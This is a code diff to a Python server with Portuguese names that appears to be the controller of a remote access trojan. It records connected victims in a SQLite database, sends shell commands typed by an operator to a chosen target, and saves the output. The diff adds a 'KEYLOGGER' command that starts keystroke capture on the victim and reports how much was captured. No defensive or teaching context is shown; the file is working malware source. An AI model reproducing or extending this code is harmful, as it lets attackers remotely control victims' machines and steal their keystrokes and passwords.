@@ -70,11 +70,26 @@ def registro_conexoes(conn,addr):
     now = datetime.now()
     dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
     db = sqlite3.connect('databases/conexoes.db')
+    cursor = db.cursor()
     cursor.execute("""
     INSERT INTO conexoes (conn, addr, horario)
     VALUES (?,?,?)""", (str(conn), str(addr), str(dt_string)))
     db.commit()
     db.close()
+
+# ========= FUNCOES DE ENVIO E RECIBO =========
+def send_recv_padrao(conn,shell_):
+    conn.send(shell_.encode())
+    output = conn.recv(2048)
+    output_ = "\nOutput do comando: {}{}".format(shell_,output.decode())
+    print("\n{}".format(output.decode()))
+    return(output_)
+
+def send_recv_keylogger(conn,shell_):
+    conn.send(shell_.encode())
+    output = conn.recv(2048)
+    mensagem = "\nKeylogger concluido com sucesso, foram capturadas {}".format(len(output))
+    print(mensagem)
 
 # ========= FUNCOES DE CONTROLE =========
 def painel_controle(lista_addr, lista_clientes):
@@ -122,9 +137,9 @@ def alvo(conn,addr):
         elif(shell_.upper() == "AJUDA"):
             ajuda_alvo()
 
+        elif(shell_.upper() == "KEYLOGGER"):
+            send_recv_keylogger(conn,shell_)
+
         else:
-            conn.send(shell_.encode())
-            output = conn.recv(2048)
-            output_ = "\nOutput do comando: {}{}".format(shell_,output.decode())
-            print("\n{}".format(output.decode()))
+            output_ = send_recv_padrao(conn,shell_)
             salvar_arquivo(output_,addr)
